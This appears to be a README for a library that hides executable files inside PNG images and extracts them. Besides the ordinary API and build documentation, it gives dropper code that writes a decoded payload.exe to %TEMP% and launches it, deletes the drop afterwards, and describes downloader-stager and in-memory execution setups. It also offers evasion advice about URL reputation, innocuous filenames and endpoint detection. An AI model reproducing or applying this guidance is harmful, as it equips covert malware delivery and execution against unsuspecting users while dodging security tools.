# Stego - hide any file inside a PNG image

You have a file. You want it to travel inside an ordinary picture - no suspicious
attachments, no weird file types, just a PNG that opens normally everywhere.
Later, you (or your program) pull the exact bytes back out. That's the whole job.

```
  your file (anything: .exe, .zip, .sh, .bin, ...)
        |
        |  stego hide
        v
  cover photo --> stego.png  (opens fine, looks the same)
        |
        |  stego reveal
        v
  your file back, bit-for-bit identical
```

Typical uses: bundling a payload with an installer graphic, watermarking
builds with their own metadata, moving a config through a channel that only
allows images, CTF and security training. If you need the bytes to *run*
somewhere, that's your code's job - this library hands you bytes and stops.
(How to run them is covered below - it is a separate step on purpose.)

## 60-second example

```powershell
pip install Pillow              # the only dependency

# 1. Hide (any file type works - this one happens to be an .exe):
python python/stego_cli.py hide payload.exe --cover photo.png -o out.png

# 2. Check what you made (no password needed for this part):
python python/stego_cli.py info out.png
# dimensions: 1983x793 (1572519 px, ~589694 payload bytes max)
# format: headered v3 (current=3)
# flags: scatter=False encrypt=False auth=False compress=False
# seed: 0
# payload size: 300544 bytes (stored 300544)

# 3. Get it back:
python python/stego_cli.py reveal out.png -o back.bin
# compare the hashes - they match on success; on any failure the tool
# tells you instead of handing you partial bytes.
```

Need secrecy too? Add a password. It changes two things: the bytes get
encrypted before hiding (wrong password = clean failure, never garbage),
and you can add an authentication tag so tampered images are rejected
instead of silently decoding wrong:

```powershell
python python/stego_cli.py hide payload.exe --cover photo.png -o out.png --password "long random phrase here" --auth
python python/stego_cli.py reveal out.png -o back.bin --password "long random phrase here"
```

## How it works (the 30-second version)

Each pixel holds 3 color values (red, green, blue). Flipping the *last bit*
of a value changes the color by 1/255 - invisible to eyes, readable to code:

```
  pixel:   [ R=142 ][ G=87 ][ B=201 ]      message bits: 1 0 1
              |         |         |
              v         v         v
           [...1]    [...0]    [...1]       <-- only the last bit touched

  3 bits per pixel. A 1983x793 photo holds ~590KB this way.
```

Before hiding, your file gets a small header (magic bytes, version, sizes,
a checksum), so decoding can tell a real payload apart from a random photo
instead of returning garbage. With a password, there's also a salt and an
authentication tag. The full byte-level layout is in `docs/FORMAT.md` -
written so a second implementation in any language can match it exactly
(C++, Python, and Rust already do; they prove it against each other in tests).

Be straight with yourself about one thing: this hides data from *casual*
inspection, not from steganalysis tools. If your threat model includes
someone running statistical tests on the image, read `docs/SECURITY.md`
first - it says plainly what this does and doesn't promise.

## Using it from code

**Python** - `from stegolib import encode_image, decode_image, capacity`
(same folder as the CLI; mirror of the C++ behavior, proven identical
by shared test vectors).

**C++** - link the static lib, or drop in the single header:
```cpp
#define STEGO_IMPLEMENTATION
#include "stego_all.h"   // single_include/

stego::Image cover{w, h, rgb};
stego::Options opt; opt.password = "pw"; opt.auth = true;
stego::Image out;
stego::Encode(cover, data, len, opt, out);   // false = won't fit / bad params
```

**C** - `include/stego/stego_c.h`: five functions, fixed-width types,
explicit error codes, you free what it allocates (`stego_free`).

**Rust** - `bindings/rust/stego` (safe wrapper) over `stego-sys`
(hand-written FFI, compiles the C++ core itself via the `cc` crate -
no libclang needed, but you do need a C++ toolchain).

**Copy-paste starters** in `examples/`: `extract.cpp`, `extract.c`,
`extract.py`, `extract.rs` - each one loads an image, decodes to a file,
nothing more. Start from whichever matches your language.

## Running what you extract

Understand this clearly: the payload you hide is very often an executable
(`.exe` on Windows, `.sh` or ELF on Linux, `.apk`, `.ps1`, a script bundle).
The library gives you those exact bytes back. Turning bytes into a running
process is a separate, ordinary programming step - write the file, launch it:

**Windows (C++)** - the standard pattern (drop under `%TEMP%`, never a
hardcoded system path):
```cpp
// out = decoded bytes from stego::Decode
char tmpDir[MAX_PATH], dropPath[MAX_PATH];
GetTempPathA(MAX_PATH, tmpDir);
sprintf_s(dropPath, "%s\\payload.exe", tmpDir);
HANDLE h = CreateFileA(dropPath, GENERIC_WRITE,
                       0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
DWORD n = 0;
WriteFile(h, out.data(), (DWORD)out.size(), &n, NULL);
CloseHandle(h);
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi = {};
char cmd[MAX_PATH * 2];
sprintf_s(cmd, "\"%s\"", dropPath);
CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
```
Check the magic first (`MZ` for PE, `#!` or ELF `\x7fELF` on Linux) so a
corrupt decode never launches garbage. Wait on the process if you need its
exit code, or close the handles and let it run detached. Delete the drop
after a successful launch if you don't want it lingering.

**Python** - same idea in three lines:
```python
open("payload.bin", "wb").write(payload)
import subprocess
subprocess.Popen(["payload.bin"])   # Linux: chmod +x first (os.chmod 0o755)
```

**Linux (C)** - write, `chmod(path, 0755)`, then `fork` + `execl`, or a
single `system()` call for throwaway tooling.

That is the entire boundary: the library proves the bytes are correct
(checksums, authentication); your code decides they are safe and runs them.

## Delivery shapes (programs that fetch images)

In practice the image rarely travels next to the program. Common shapes,
honestly scored:

```
  SHAPE A - bundled image            SHAPE B - downloader stager
  app ships with out.png beside      app fetches https://host/i.png
  the binary (or as a resource).     on first run, then extracts+runs.
  No network. Simplest to            Small distributor, payload never
  reason about.                      on disk in transit as a binary.

  SHAPE C - scheduled/service runner SHAPE D - memory handoff
  OS launches your program on a      decode to RAM, execute without
  trigger; it fetches + runs.       touching disk. Most complex, most
  Good for updaters; very visible   scrutinized by endpoint products
  to task/service auditing.         (anonymous executable memory is a
                                    classic red flag). Only if disk
                                    writes are truly impossible.
```

Practical notes that apply to all four: serve images over HTTPS from a
reputable host (URL reputation is scored independently of content);
boring filenames (banner, texture, sprite); never re-save through a
JPEG pipeline, chat app, or CDN "optimization" (any recompression kills
the low bits and the payload with them); validate `MZ`/magic before
launch so a swapped image fails closed instead of executing junk.

## Building and testing

```powershell
# Library only (default - no executables emitted):
cmake -S . -B build -G "Visual Studio 18 2026" -A x64
cmake --build build --config Release

# With tests + examples:
cmake -S . -B build -G "Visual Studio 18 2026" -A x64 `
  -DSTEGO_BUILD_TESTS=ON -DSTEGO_BUILD_EXAMPLES=ON
ctest --test-dir build -C Release --output-on-failure
python -m pytest tests/ -q
```

Linux: same tree, plain GCC (`cmake -S . -B build -DSTEGO_BUILD_TESTS=ON`);
GDI+ examples skip themselves outside Windows. MinGW produces a real `.a`.

## Repo map (where everything lives)

```
include/stego/   public headers (C++ API, C ABI, format constants)
src/             the implementation (sha256, codec, api)
single_include/  stego_all.h - same code, one file, stb-style
python/          CLI + importable package + pip metadata
bindings/rust/   stego-sys (FFI) + stego (safe wrapper)
examples/        one decode-to-file template per language
tests/           round-trips, golden vectors, malformed inputs, boundaries,
                 cross-implementation matrix (C++ <-> Python agree byte-wise)
docs/            FORMAT (the spec) - API - MIGRATION - INTEGRATION - SECURITY
```

## Practical rules that will save you trouble

1. **Capacity first.** Payload + ~80 bytes overhead must fit in `width x height x 3`
   bits. The tool refuses with a clear error otherwise - pick a bigger photo,
   not wishful thinking. `stego info` tells you an image's budget.
2. **Passwords: 20+ random characters.** Short passwords in, brute force out.
3. **Keep the PNG lossless end-to-end.** Never re-save through a JPEG pipeline,
   a chat app that recompresses, or an uploader that strips metadata - any of
   those destroys the low bits and the payload with them. PNG in, PNG out.
4. **Grayscale/palette inputs get converted to RGB** (documented in FORMAT).
   Alpha channel is never used for storage.
5. **Decode failures are final.** Corrupt image, wrong password, truncated file -
   you get an error, never half a payload.
6. **Validate before you launch.** Check magic bytes after every decode;
   never execute output from a failed or unchecked decode.

## Versioning

`VERSION` file is authoritative (`2.1.1`). `STEGO_FORMAT_VERSION` (currently 3)
names the written layout; `STEGO_ABI_VERSION` (currently 1) names the C ABI -
a format bump never implies an ABI bump. Old layouts (v1, v2) stay decodable;
see `docs/MIGRATION.md`.

## License

MIT - see `LICENSE`. Contributing notes in `CONTRIBUTING.md`, changes in
`CHANGELOG.md`.
